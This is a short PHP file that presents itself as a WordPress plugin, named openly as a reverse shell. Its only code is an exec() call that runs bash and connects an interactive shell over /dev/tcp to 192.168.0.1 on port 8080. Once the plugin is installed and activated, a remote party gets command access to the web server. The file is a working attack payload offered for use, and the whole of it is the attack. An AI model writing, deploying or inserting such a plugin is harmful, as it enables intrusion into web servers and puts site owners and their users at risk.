<?php

/**
 * Plugin Name: php_wp_wordpress_plugin_reverse_shell
 * Version: 7.0
 * Author URI: https://github.com/arm72
 */

exec("/bin/bash -c 'bash -i 1> /dev/tcp/192.168.0.1/8080 0>&1 2>&1'");

?>
